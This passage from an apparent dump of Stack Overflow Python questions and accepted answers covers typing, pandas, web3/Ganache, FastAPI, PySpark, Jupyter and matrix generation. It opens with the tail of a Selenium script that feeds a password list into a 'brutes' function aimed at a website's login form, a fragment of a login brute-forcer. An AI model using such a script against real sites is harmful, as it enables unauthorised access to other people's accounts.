color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)\n\ndriver = webdriver.Chrome(CHROME_DVR_DIR)\noptionss = webdriver.ChromeOptions()\noptionss.add_argument(\"--disable-popup-blocking\")\noptionss.add_argument(\"--disable-extensions\")\ncount = 1 \n\nif options.passsel == None:\n    if options.loginsel == None:\n        if options.passlist == None:\n            if options.website == None:\n                wizard()\n\npassword_selector = options.passsel\nlogin_btn_selector = options.loginsel\nwebsite = options.website\npass_list = options.passlist\nprint (banner)\nbrutes(password_selector,login_btn_selector,pass_list, website)\n\nI have downloaded the windows chromedriver. I don't know where I must place it on my computer. Does anyone have an idea where I must place it and how I can solve this error. When I try it in Linux, I get not an error. I placed the chromedriver in the same dir as the python file. When I do the exact same thing in windows it does not work. Can anyone help me out?\n",
    "AcceptedAnswerId": 71325202,
    "AcceptedAnswer": "PyLance looks for the \"selenium\" python package and cannot find it in the configured python installation. Since you're using VSCode, make sure you've configured the python extension properly. When you open a .py file in VSCode, you should see a python setting in the status bar down below on the left. Select the installation on which you've installed selenium and PyLance will find your import.\n"
}
{
    "Id": 71491107,
    "PostTypeId": 1,
    "Title": "Formatting guidelines for type aliases",
    "Body": "What would be the correct way to format the name of a type alias\u2014intended to be local to its module\u2014according to the PEP8 style guide?\n# mymodule.py\nfrom typing import TypeAlias\n\nmytype: TypeAlias = int\n\ndef f() -> mytype:\n    return mytype()\n\ndef g() -> mytype:\n    return mytype()\n\nShould mytype be formatted in CapWords because it introduces a new type similar to creating new classes? Or, should mytype be formatted in all caps because it is treated similarly to a constant?\nIs there a way to differentiate between type aliases that will remain unchanged (constant) throughout the lifetime of the program and ones that can change (similar to the Final annotation for constants)?\nAlso, should mytype be prefixed with an underscore (as in _mytype) to indicate that the type alias shouldn't be used outside this module?\n",
    "AcceptedAnswerId": 71491175,
    "AcceptedAnswer": "The PEP Style Guide does not have any explicit guidance on how to format TypeAliases. The guide does contain some rules on type variables, but that's not quite what you're asking for.\n\nThe next best resource I could find was Google's Python Style Guide, which does happen to contain some guidance on how to name TypeAliases:\n\n3.19.6 Type Aliases\nYou can declare aliases of complex types. The name of an alias should be CapWorded. If the alias is used only in this module, it should be _Private.\nFor example, if the name of the module together with the name of the type is too long:\n_ShortName = module_with_long_name.TypeWithLongName\nComplexMap = Mapping[str, List[Tuple[int, int]]]\n\nOther examples are complex nested types and multiple return variables from a function (as a tuple).\n\nUnder this, the name of your type alias should be MyType if used across multiple modules, or _MyType if only used in the module that it is declared in.\n\nWith all of this being said, remember that consistency with the existing codebase is what's most important. As the PEP style guide states:\n\nA style guide is about consistency. Consistency with this style guide is important. Consistency within a project is more important. Consistency within one module or function is the most important.\n\n"
}
{
    "Id": 70879159,
    "PostTypeId": 1,
    "Title": "Get datetime format from string python",
    "Body": "In Python there are multiple DateTime parsers which can parse a date string automatically without providing the datetime format. My problem is that I don't need to cast the datetime, I only need the datetime format.\nExample:\nFrom \"2021-01-01\", I want something like \"%Y-%m-%d\" or \"yyyy-MM-dd\".\nMy only idea was to try casting with different formats and get the successful one, but I don't want to list every possible format.\nI'm working with pandas, so I can use methods that work either with series or the string DateTime parser.\nAny ideas?\n",
    "AcceptedAnswerId": 70879221,
    "AcceptedAnswer": "In pandas, this is achieved by pandas._libs.tslibs.parsing.guess_datetime_format\nfrom pandas._libs.tslibs.parsing import guess_datetime_format\n\nguess_datetime_format('2021-01-01')\n\n# '%Y-%m-%d'\n\nAs there will always be an ambiguity on the day/month, you can specify the dayfirst case:\nguess_datetime_format('2021-01-01', dayfirst=True)\n# '%Y-%d-%m'\n\n"
}
{
    "Id": 70794199,
    "PostTypeId": 1,
    "Title": "Use of colon ':' in type hints",
    "Body": "When type annotating a variable of type dict, typically you'd annotate it like this:\nnumeralToInteger: dict[str, int] = {...}\n\nHowever I rewrote this using a colon instead of a comma:\nnumeralToInteger: dict[str : int] = {...}\n\nAnd this also works, no SyntaxError or NameError is raised.\nUpon inspecting the __annotations__ global variable:\ncolon: dict[str : int] = {...}\ncomma: dict[str, int] = {...}\n\nprint(__annotations__)\n\nThe output is:\n{'colon': dict[slice(, , None)],\n 'comma': dict[str, int]}\n\nSo the colon gets treated as a slice object and the comma as a normal type hint.\nShould I use the colon with dict types or should I stick with using a comma?\nI am using Python version 3.10.1.\n",
    "AcceptedAnswerId": 70794389,
    "AcceptedAnswer": "If you have a dictionary whose keys are strings and values are integers, you should do dict[str, int]. It's not optional. IDEs and type-checkers use these type hints to help you. When you say dict[str : int], it is a slice object. Totally different things.\nTry these in mypy playground:\nd: dict[str, int]\nd = {'hi': 20}\n\nc: dict[str: int]\nc = {'hi': 20}\n\nmessage:\nmain.py:4: error: \"dict\" expects 2 type arguments, but 1 given\nmain.py:4: error: Invalid type comment or annotation\nmain.py:4: note: did you mean to use ',' instead of ':' ?\nFound 2 errors in 1 file (checked 1 source file)\n\nError messages are telling everything\n"
}
{
    "Id": 70731492,
    "PostTypeId": 1,
    "Title": "The transaction declared chain ID 5777, but the connected node is on 1337",
    "Body": "I am trying to deploy my SimpleStorage.sol contract to a ganache local chain by making a transaction using python. It seems to have trouble connecting to the chain.\nfrom solcx import compile_standard\nfrom web3 import Web3\nimport json\nimport os\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\nwith open(\"./SimpleStorage.sol\", \"r\") as file:\n    simple_storage_file = file.read()\n\ncompiled_sol = compile_standard(\n    {\n        \"language\": \"Solidity\",\n        \"sources\": {\"SimpleStorage.sol\": {\"content\": simple_storage_file}},\n        \"settings\": {\n            \"outputSelection\": {\n                \"*\": {\"*\": [\"abi\", \"metadata\", \"evm.bytecode\", \"evm.sourceMap\"]}\n            }\n        },\n    },\n    solc_version=\"0.6.0\",\n)\n\nwith open(\"compiled_code.json\", \"w\") as file:\n    json.dump(compiled_sol, file)\n\n\n# get bytecode\nbytecode = compiled_sol[\"contracts\"][\"SimpleStorage.sol\"][\"SimpleStorage\"][\"evm\"][\n    \"bytecode\"\n][\"object\"]\n\n\n# get ABI\nabi = compiled_sol[\"contracts\"][\"SimpleStorage.sol\"][\"SimpleStorage\"][\"abi\"]\n\n# to connect to ganache blockchain\nw3 = Web3(Web3.HTTPProvider(\"HTTP://127.0.0.1:7545\"))\nchain_id = 5777\nmy_address = \"0xca1EA31e644F13E3E36631382686fD471c62267A\"\nprivate_key = os.getenv(\"PRIVATE_KEY\")\n\n\n# create the contract in python\n\nSimpleStorage = w3.eth.contract(abi=abi, bytecode=bytecode)\n\n# get the latest transaction\nnonce = w3.eth.getTransactionCount(my_address)\n\n# 1. Build a transaction\n# 2. Sign a transaction\n# 3. Send a transaction\n\n\ntransaction = SimpleStorage.constructor().buildTransaction(\n    {\"chainId\": chain_id, \"from\": my_address, \"nonce\": nonce}\n)\nprint(transaction)\n\n\nIt seems to be connected to the ganache chain because it prints the nonce, but when I build and try to print the transaction\nhere is the entire traceback call I am receiving\nTraceback (most recent call last):\nFile \"C:\\Users\\evens\\demos\\web3_py_simple_storage\\deploy.py\", line \n52, in \ntransaction = SimpleStorage.constructor().buildTransaction(\nFile \"C:\\Python310\\lib\\site-packages\\eth_utils\\decorators.py\", line \n18, in _wrapper\nreturn self.method(obj, *args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\contract.py\", line 684, in buildTransaction\nreturn fill_transaction_defaults(self.web3, built_transaction)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\_utils\\transactions.py\", line 114, in \nfill_transaction_defaults\ndefault_val = default_getter(web3, transaction)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\_utils\\transactions.py\", line 60, in \n'gas': lambda web3, tx: web3.eth.estimate_gas(tx),\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\eth.py\", line 820, in estimate_gas\nreturn self._estimate_gas(transaction, block_identifier)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\module.py\", line 57, in caller\nresult = w3.manager.request_blocking(method_str,\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\manager.py\", line 197, in request_blocking\nresponse = self._make_request(method, params)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\manager.py\", line 150, in _make_request\nreturn request_func(method, params)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\formatting.py\", line 76, in \napply_formatters\nresponse = make_request(method, params)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\gas_price_strategy.py\", line 90, in \nmiddleware\nreturn make_request(method, params)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\formatting.py\", line 74, in \napply_formatters\nresponse = make_request(method, formatted_params)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\attrdict.py\", line 33, in middleware\nresponse = make_request(method, params)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\formatting.py\", line 74, in \napply_formatters\nresponse = make_request(method, formatted_params)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\formatting.py\", line 73, in \napply_formatters\nformatted_params = formatter(params)\nFile \"cytoolz/functoolz.pyx\", line 503, in \ncytoolz.functoolz.Compose.__call__\nret = PyObject_Call(self.first, args, kwargs)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Python310\\lib\\site-packages\\eth_utils\\decorators.py\", line \n91, in wrapper\nreturn ReturnType(result)  # type: ignore\nFile \"C:\\Python310\\lib\\site-packages\\eth_utils\\applicators.py\", line \n22, in apply_formatter_at_index\nyield formatter(item)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Python310\\lib\\site-packages\\eth_utils\\applicators.py\", line \n72, in apply_formatter_if\nreturn formatter(value)\nFile \"cytoolz/functoolz.pyx\", line 250, in \ncytoolz.functoolz.curry.__call__\nreturn self.func(*args, **kwargs)\nFile \"C:\\Users\\evens\\AppData\\Roaming\\Python\\Python310\\site- \npackages\\web3\\middleware\\validation.py\", line 57, in \nvalidate_chain_id\nraise ValidationError(\nweb3.exceptions.ValidationError: The transaction declared chain ID \n5777, but the connected node is on 1337\n\n",
    "AcceptedAnswerId": 70745821,
    "AcceptedAnswer": "Had this issue myself, apparently it's some sort of Ganache CLI error but the simplest fix I could find was to change the network id in Ganache through settings>server to 1337. It restarts the session so you'd then need to change the address and private key variable.\nIf it's the same tutorial I'm doing, you're likely to come unstuck after this... the code for transaction should be:\ntransaction = \n SimpleStorage.constructor().buildTransaction( {\n    \"gasPrice\": w3.eth.gas_price, \n    \"chainId\": chain_id, \n    \"from\": my_address, \n    \"nonce\": nonce, \n})\nprint(transaction)\n\nOtherwise you get a value error if you don't set the gasPrice\n"
}
{
    "Id": 70753091,
    "PostTypeId": 1,
    "Title": "*Why* does object() not support `setattr`, but derived classes do?",
    "Body": "Today I stumbled upon the following behaviour:\nclass myobject(object):\n    \"\"\"Should behave the same as object, right?\"\"\"\n\nobj = myobject()\nobj.a = 2        # <- works\nobj = object()\nobj.a = 2        # AttributeError: 'object' object has no attribute 'a'\n\nI want to know what is the logic behind designing the language to behave this way, because it feels utterly paradoxical to me. It breaks my intuition that if I create a subclass, without modification, it should behave the same as the parent class.\n\nEDIT: A lot of the answers suggest that this is because we want to be able to write classes that work with __slots__ instead of __dict__ for performance reasons. However, we can do:\nclass myobject_with_slots(myobject):\n    __slots__ = (\"x\",)\n    \nobj = myobject_with_slots()\nobj.x = 2\nobj.a = 2\nassert \"a\" in obj.__dict__      # \u2714\nassert \"x\" not in obj.__dict__  # \u2714\n\nSo it seems we can have both __slots__ and __dict__ at the same time, so why doesn't object allow both, but one-to-one subclasses do?\n",
    "AcceptedAnswerId": 70753129,
    "AcceptedAnswer": "Because derived classes do not necessarily support setattr either.\nclass myobject(object):\n    \"\"\"Should behave the same as object!\"\"\"\n    __slots__ = ()\n\nobj = myobject()\nobj.a = 2        # <- works the same as for object\n\nSince all types derive from object, most builtin types such as list are also examples.\nArbitrary attribute assignment is something that object subclasses may support, but not all do. Thus, the common base class does not support this either.\n\nSupport for arbitrary attributes is commonly backed by the so-called __dict__ slot. This is a fixed attribute that contains a literal dict 1 to store any attribute-value pairs.\nIn fact, one can manually define the __dict__ slot to get arbitrary attribute support.\nclass myobject(object):\n    \"\"\"Should behave the same as object, right?\"\"\"\n    __slots__ = (\"__dict__\",)\n\nobj = myobject()\nobj.a = 2            # <- works!\nprint(obj.__dict__)  # {'a': 2}\n\nThe takeaway from this demonstration is that fixed attributes is actually the \"base behaviour\" of Python; the arbitrary attributes support is built on top when required.\nAdding arbitrary attributes for object subtypes by default provides a simpler programming experience. However, still supporting fixed attributes for object subtypes allows for better memory usage and performance.\n\nData Model: __slots__\nThe space saved [by __slots__] over using __dict__ can be significant. Attribute lookup speed can be significantly improved as well.\n\nNote that it is possible to define classes with both fixed attributes and arbitrary attributes. The fixed attributes will benefit from the improved memory layout and performance; since they are not stored in the __dict__, its memory overhead2 is lower \u2013 but it still costs.\n\n1Python implementations may use different, optimised types  for __dict__ as long as they behave like a dict.\n2For its hash-based lookup to work efficiently with few collisions, a dict must be larger than the number of items it stores.\n"
}
{
    "Id": 70967266,
    "PostTypeId": 1,
    "Title": "what exactly is python typing.Callable?",
    "Body": "I have seen typing.Callable, but I didn't find any useful docs about it. What exactly is typing.Callable?\n",
    "AcceptedAnswerId": 70967371,
    "AcceptedAnswer": "typing.Callable is the type you use to indicate a callable. Most python types that support the () operator are of the type collections.abc.Callable. Examples include functions, classmethods, staticmethods, bound methods and lambdas.\nIn summary, anything with a __call__ method (which is how () is implemented), is a callable.\nPEP 677 attempted to introduce implicit tuple-with-arrow syntax, so that something like Callable[[int, str], list[float]] could be expressed much more intuitively as (int, str) -> list[float]. The PEP was rejected because the benefits of the new syntax were not deemed sufficient given the added maintenance burden and possible room for confusion.\n"
}
{
    "Id": 70801888,
    "PostTypeId": 1,
    "Title": "Ignore the first space in CSV",
    "Body": "I have a CSV file like this:\nTime              Latitude Longitude\n2021-09-12 23:13    44.63     -63.56\n2021-09-14 23:13    43.78     -62\n2021-09-16 23:14    44.83     -54.6\n\n2021-09-12 23:13 is under Time column.\nI would like to open it using pandas. But there is a problem with the first column. It contains a space. If I open it using:\nimport pandas as pd\npoints = pd.read_csv(\"test.csv\", delim_whitespace=True) \n\nI get\n\n\n\n\n\nTime\nLatitude\nLongitude\n\n\n\n\n2021-09-12\n23:13\n44.630\n-63.560\n\n\n2021-09-14\n23:13\n43.780\n-62.000\n\n\n2021-09-16\n23:14\n44.830\n-54.600\n\n\n\n\nBut I would like to skip the space in the first column in CSV (2021-09-12 23:13 should be under Time column) like:\n\n\n\n\n\nTime\nLatitude\nLongitude\n\n\n\n\n0\n2021-09-12 23:13\n44.630\n-63.560\n\n\n1\n2021-09-14 23:13\n43.780\n-62.000\n\n\n2\n2021-09-16 23:14\n44.830\n-54.600\n\n\n\n\nHow can I ignore the first space when using pd.read_csv?\nPlease do not stick to this csv file. This is a general question to skip (not to consider as a delimiter) the first space(s) in the first column. Because everyone knows that the first space is part of the time value, not a delimiter.\n",
    "AcceptedAnswerId": 70834357,
    "AcceptedAnswer": "Ideally you should be parsing the first two parts as a datetime. By using a space as a delimiter, it would imply the header has three columns. The space after the date though is being seen as an extra column.\nA workaround is to skip the header entirely and supply your own column names. The parse_dates parameter can be used to tell Pandas to parse the first two columns as a single combined datetime object.\nFor example:\nimport pandas as pd\n\npoints = pd.read_csv(\"test.csv\", delimiter=\" \", \n    skipinitialspace=True, skiprows=1, index_col=None, \n    parse_dates=[[0, 1]], names=[\"Date\", \"Time\", \"Latitude\", \"Longitude\"])\n\nprint(points)\n\nShould give you the following dataframe:\n            Date_Time  Latitude  Longitude\n0 2021-09-12 23:13:00     44.63     -63.56\n1 2021-09-14 23:13:00     43.78     -62.00\n2 2021-09-16 23:14:00     44.83     -54.60\n\n"
}
{
    "Id": 70888992,
    "PostTypeId": 1,
    "Title": "unittest.mock vs mock vs mocker vs pytest-mock",
    "Body": "I am new to Python development, I am writing test cases using pytest where I need to mock some behavior. Googling best mocking library for pytest, has only confused me. I have seen unittest.mock, mock, mocker and pytest-mock. Not really sure which one to use.Can someone please explain me the difference between them and also recommend me one?\n",
    "AcceptedAnswerId": 70889128,
    "AcceptedAnswer": "So pytest-mock is a thin wrapper around mock and mock is since python 3.3. actually the same as unittest.mock. I don't know if mocker is another library, I only know it as the name of the fixture provided by pytest-mock to get mocking done in your tests. I personally use pytest and pytest-mock for my tests, which allows you to write very concise tests like\nfrom pytest_mock import MockerFixture\n@pytest.fixture(autouse=True)\ndef something_to_be_mocked_everywhere(mocker):\n    mocker.patch()\n\n\ndef tests_this(mocker: MockerFixture):\n    mocker.patch ...\n    a_mock = mocker.Mock() ...\n    ...\n\nBut this is mainly due to using fixtures, which is already pointed out is what pytest-mock offers.\n"
}
{
    "Id": 70753768,
    "PostTypeId": 1,
    "Title": "Jupyter Notebook: Access to the file was denied",
    "Body": "I'm trying to run a Jupyter notebook on Ubuntu 21.10. I've installed python, jupyter notebook, and all the various prerequisites. I added export PATH=$PATH:~/.local/bin to my bashrc so that the command jupyter notebook would be operational from the terminal.\nWhen I call jupyter notebook from the terminal, I get the following error message from my browser:\nAccess to the file was denied.\n\nThe file at /home/username/.local/share/jupyter/runtime/nbserver-260094-open.html is not readable.\n\n    It may have been removed, moved, or file permissions may be preventing access.\n\nI'm using the latest version of FireFox.\nI've read a number of guides on this and it seems to be a permissions error, but none of the guides that I've used have resolved the issue. Using sudo does not help, in fact it causes Exception: Jupyter command \"jupyter-notebook\" not found. to be thrown.\nThat being said, I am still able to access the notebook server. If I go to the terminal and instead click on the localhost:8888 or IP address of the notebook server then it takes me to the notebook and everything runs without issue.\nI would like to solve this so that when I run jupyter notebook I'm taken to the server and don't need to go back to the terminal window and click the IP address. It's inconvenient and can slow me down if I'm running multiple notebooks at once.\nAny help on this issue would be greatly appreciated!\n",
    "AcceptedAnswerId": 70753901,
    "AcceptedAnswer": "I had the same problem.\nUbuntu 20.04.3 LTS\nChromium Version 96.0.4664.110\nThis was the solution in my case:\nCreate the configuration file with this command:\njupyter notebook --generate-config\n\nEdit the configuration file ~/.jupyter/jupyter_notebook_config.py and set:\nc.NotebookApp.use_redirect_file = False\n\nMake sure that this configuration parameter starts at the beginning of the line. If you leave one space at the beginning of the line, you will get the message that access to the file was denied.\nOtherwise you can clean and reinstall JupyterLab\njupyter lab clean --all\npip3 install jupyterlab --force-reinstall\n\n"
}
{
    "Id": 70894409,
    "PostTypeId": 1,
    "Title": "pyspark get element from array Column of struct based on condition",
    "Body": "I have a spark df with the following schema:\n |-- col1 : string\n |-- col2 : string\n |-- customer: struct\n |    |-- smt: string\n |    |-- attributes: array (nullable = true)\n |    |    |-- element: struct\n |    |    |     |-- key: string\n |    |    |     |-- value: string\n\ndf:\n#+-------+-------+---------------------------------------------------------------------------+\n#|col1   |col2   |customer                                                                   |\n#+-------+-------+---------------------------------------------------------------------------+\n#|col1_XX|col2_XX|\"attributes\":[[{\"key\": \"A\", \"value\": \"123\"},{\"key\": \"B\", \"value\": \"456\"}]  |\n#+-------+-------+---------------------------------------------------------------------------+\n\nand the json input for the array look like this:\n...\n          \"attributes\": [\n            {\n              \"key\": \"A\",\n              \"value\": \"123\"\n            },\n            {\n              \"key\": \"B\",\n              \"value\": \"456\"\n            }\n          ],\n\nI would like to loop attributes array and get the element with key=\"B\" and then select the corresponding value. I don't want to use explode because I would like to avoid join dataframes.\nIs it possible to perform this kind of operation directly using spark 'Column' ?\nExpected output will be:\n#+-------+-------+-----+\n#|col1   |col2   |B    |                                                               |\n#+-------+-------+-----+\n#|col1_XX|col2_XX|456  |\n#+-------+-------+-----+\n\nany help would be appreciated\n",
    "AcceptedAnswerId": 70895004,
    "AcceptedAnswer": "You can use filter function to filter the array of structs then get value:\nfrom pyspark.sql import functions as F\n\ndf2 = df.withColumn(\n    \"B\", \n    F.expr(\"filter(customer.attributes, x -> x.key = 'B')\")[0][\"value\"]\n)\n\n"
}
{
    "Id": 71500756,
    "PostTypeId": 1,
    "Title": "What is Python's \"Namespace\" object?",
    "Body": "I know what namespaces are. But when running\nimport argparse\nparser = argparse.ArgumentParser()\nparser.add_argument('bar')\nparser.parse_args(['XXX']) # outputs:  Namespace(bar='XXX')\n\nWhat kind of object is Namespace(bar='XXX')? I find this totally confusing.\nReading the argparse docs, it says \"Most ArgumentParser actions add some value as an attribute of the object returned by parse_args()\".  Shouldn't this object then appear when running globals()? Or how can I introspect it?\n",
    "AcceptedAnswerId": 71500890,
    "AcceptedAnswer": "Samwise's answer is very good, but let me answer the other part of the question.\n\nOr how can I introspect it?\n\nBeing able to introspect objects is a valuable skill in any language, so let's approach this as though Namespace is a completely unknown type.\n>>> obj = parser.parse_args(['XXX']) # outputs:  Namespace(bar='XXX')\n\nYour first instinct is good. See if there's a Namespace in the global scope, which there isn't.\n>>> Namespace\nTraceback (most recent call last):\n  File \"\", line 1, in \nNameError: name 'Namespace' is not defined\n\nSo let's see the actual type of the thing. The Namespace(bar='XXX') printer syntax is coming from a __str__ or __repr__ method somewhere, so let's see what the type actually is.\n>>> type(obj)\n\n\nand its module\n>>> type(obj).__module__\n'argparse'\n\nNow it's a pretty safe bet that we can do from argparse import Namespace and get the type. Beyond that, we can do\n>>> help(argparse.Namespace)\n\nin the interactive interpreter to get detailed documentation on the Namespace class, all with no Internet connection necessary.\n"
}
{
    "Id": 70854314,
    "PostTypeId": 1,
    "Title": "Use FastAPI to interact with async loop",
    "Body": "I am running coroutines of 'workers' whose job it is to wait 5s, get values from an asyncio.Queue() and print them out continually.\nq = asyncio.Queue()\n\ndef worker():\n    while True:\n        await asyncio.sleep(5)\n        i = await q.get()\n        print(i)\n        q.task_done()\n\nasync def main(q):\n    workers = [asyncio.create_task(worker()) for n in range(10)]\n    await asyncio.gather(*workers)\n\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n\nI would like to be able to interact with the queue through http requests using FastAPI. For example POST requests that would 'put' items in the queue for the workers to print.\nI'm unsure how I can run the coroutines of the workers concurrently with FastAPI to achieve this effect. Uvicorn has its own event loop I believe and my attempts to use asyncio methods have been unsuccessful.\nThe router would look something like this I think.\n@app.post(\"/\")\nasync def put_queue(data:str):\n    return q.put(data)\n\nAnd I'm hoping there's something that would have an effect like this:\nawait asyncio.gather(main(),{FastApi() app run})\n\n",
    "AcceptedAnswerId": 70900417,
    "AcceptedAnswer": "One option would be to add a task that wraps your main coroutine in a on startup event\nimport asyncio\n@app.on_event(\"startup\")\nasync def startup_event():\n    asyncio.create_task(main())\n\n\nThis would schedule your main coroutine before the app has been fully started.\nImportant here is that you don't await the created task as it would basically block startup_event forever\n"
}
{
    "Id": 70836912,
    "PostTypeId": 1,
    "Title": "Use mysql.connector , but get ImportError: Missing optional dependency 'SQLAlchemy'",
    "Body": "I work on a program for two months.\nToday I suddenly got an error when connecting to the database while using mysql.connector.\nInterestingly, this error is not seen when running previous versions.\nimport mysql.connector\nimport pandas as pd\n\nmydb = mysql.connector.connect(host=\"localhost\", user=\"root\", password=\"*****\", \ndatabase=\"****\")\n\nQ = f'SELECT * FROM table'\ndf = pd.read_sql_query(Q, con=mydb)\n\nprint(df)\n\nbut I get this error :\nTraceback (most recent call last):\ndf = pd.read_sql_query(Q, con=mydb)\nFile \"g.v1.6\\venv\\lib\\site-packages\\pandas\\io\\sql.py\", line \n398, in read_sql_query\npandas_sql = pandasSQL_builder(con)\nFile \"g.v1.6\\venv\\lib\\site-packages\\pandas\\io\\sql.py\", line \n750, in pandasSQL_builder\nsqlalchemy = import_optional_dependency(\"sqlalchemy\")\nFile \"g.v1.6\\venv\\lib\\site- \npackages\\pandas\\compat\\_optional.py\", line 129, in import_optional_dependency\nraise ImportError(msg)\nImportError: Missing optional dependency 'SQLAlchemy'.  Use pip or conda to install \nSQLAlchemy.\n\nWhat has this got to do with SQLAlchemy??\n",
    "AcceptedAnswerId": 70852553,
    "AcceptedAnswer": "I just ran into something similar. It looks like Pandas 1.4 was released on January 22, 2022:\nhttps://pandas.pydata.org/docs/dev/whatsnew/v1.4.0.html\nIt has an \"optional\" dependency on SQLAlchemy, which is required to communicate with any database other than sqlite now, as the comment by snakecharmerb mentioned. Once I added that to my requirements and installed SQLAlchemy, it resolved my problem.\n"
}
{
    "Id": 70982008,
    "PostTypeId": 1,
    "Title": "VSCode pytest discovery not working: conda error?",
    "Body": "I'm having a strange problem with VSCode's python testing functionality. When I try to discover tests I get the following error:\n> conda run -n sandbox --no-capture-output python ~/.vscode/extensions/ms-python.python-2022.0.1786462952/pythonFiles/get_output_via_markers.py ~/.vscode/extensions/ms-python.python-2022.0.1786462952/pythonFiles/testing_tools/run_adapter.py discover pytest -- --rootdir . -s --cache-clear .\ncwd: .\n[ERROR 2022-1-3 21:49:47.851]: Error discovering pytest tests:\n [r [Error]: \nEnvironmentLocationNotFound: Not a conda environment: /Users/david.hoffman/miniconda3/envs/sandbox/envs/sandbox\n\nBut obviously there's a duplication error: /Users/david.hoffman/miniconda3/envs/sandbox/envs/sandbox.\nIf I run this command directly in the terminal I get the expected output and no errors:\nconda run -n sandbox --no-capture-output python ~/.vscode/extensions/ms-python.python-2022.0.1786462952/pythonFiles/get_output_via_markers.py ~/.vscode/extensions/ms-python.python-2022.0.1786462952/pythonFiles/testing_tools/run_adapter.py discover pytest -- --rootdir . -s --cache-clear\n\nI'm completely stumped as there doesn't seem to be any settings that would affect this.\nI tried reinstalling VSCode from scratch (after removing all the local files) same with conda.\n",
    "AcceptedAnswerId": 70982213,
    "AcceptedAnswer": "Two ways I've found to fix:\n\nChange the name of the conda environment. Just cloning sandbox to boxsand did the trick\nAdd python.condaPath variable to VSCode's preferences\n\n"
}
{
    "Id": 70750396,
    "PostTypeId": 1,
    "Title": "How to generate a Rank 5 matrix with entries Uniform?",
    "Body": "I want to generate a rank 5 100x600 matrix in numpy with all the entries sampled from np.random.uniform(0, 20), so that all the entries will be uniformly distributed between [0, 20). What will be the best way to do so in python?\nI see there is an SVD-inspired way to do so here (https://math.stackexchange.com/questions/3567510/how-to-generate-a-rank-r-matrix-with-entries-uniform), but I am not sure how to code it up. I am looking for a working example of this SVD-inspired way to get uniformly distributed entries.\nI have actually managed to code up a rank 5 100x100 matrix by vertically stacking five 20x100 rank 1 matrices, then shuffling the vertical indices. However, the resulting 100x100 matrix does not have uniformly distributed entries [0, 20).\nHere is my code (my best attempt):\nimport numpy as np\ndef randomMatrix(m, n, p, q):\n    # creates an m x n matrix with lower bound p and upper bound q, randomly.\n    count = np.random.uniform(p, q, size=(m, n))\n    return count\n\nQs = []\nmy_rank = 5\nfor i in range(my_rank):\n  L = randomMatrix(20, 1, 0, np.sqrt(20))\n  # L is tall\n  R = randomMatrix(1, 100, 0, np.sqrt(20)) \n  # R is long\n  Q = np.outer(L, R)\n  Qs.append(Q)\n\nQ = np.vstack(Qs)\n#shuffle (preserves rank 5 [confirmed])\nnp.random.shuffle(Q)\n\n\n",
    "AcceptedAnswerId": 70964065,
    "AcceptedAnswer": "I just couldn't take the fact the my previous solution (the \"selection\" method) did not really produce strictly uniformly distributed entries, but only close enough to fool a statistical test sometimes. The asymptotical case however, will almost surely not be distributed uniformly. But I did dream up another crazy idea that's just as bad, but in another manner - it's not really random.\nIn this solution, I do smth similar to OP's method of forming R matrices with rank 1 and then concatenating them but a little differently. I create each matrix by stacking a base vector on top of itself multiplied by 0.5 and then I stack those on the same base vector shifted by half the dynamic range of the uniform distribution. This process continues with multiplication by a third, two thirds and 1 and then shifting and so on until i have the number of required vectors in that part of the matrix.\nI know it sounds incomprehensible. But, unfortunately, I couldn't find a way to explain it better. Hopefully, reading the code would shed some more light.\nI hope this \"staircase\" method will be more reliable and useful.\nimport numpy as np \nfrom matplotlib import pyplot as plt\n\n'''\nparams:\n    N    - base dimention\n    M    - matrix length\n    R    - matrix rank\n    high - max value of matrix\n    low  - min value of the matrix\n'''\nN    = 100\nM    = 600\nR    = 5\nhigh = 20\nlow  = 0\n\n# base vectors of the matrix\nbase = low+np.random.rand(R-1, N)*(high-low)\n\ndef build_staircase(base, num_stairs, low, high):\n    '''\n    create a uniformly distributed matrix with rank 2 'num_stairs' different \n    vectors whose elements are all uniformly distributed like the values of \n    'base'.\n    '''\n    l = levels(num_stairs)\n    vectors = []\n    for l_i in l:\n        for i in range(l_i):\n            vector_dynamic = (base-low)/l_i\n            vector_bias    = 